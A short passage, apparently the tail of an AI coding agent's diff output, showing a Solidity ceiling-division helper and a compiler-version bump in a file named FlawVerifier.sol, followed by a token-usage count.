+  function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
+    return x == 0 ? 0 : ((x - 1) / y) + 1;
+  }
+}
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 781029ea96e782c7b69fbc4994c815ff417ca642..b1862fd39344f82b47e358ffafe86b9d446c3fd3
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.17;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+   function balanceOf(address account) external view returns (uint256);
+
+tokens used
+29,394
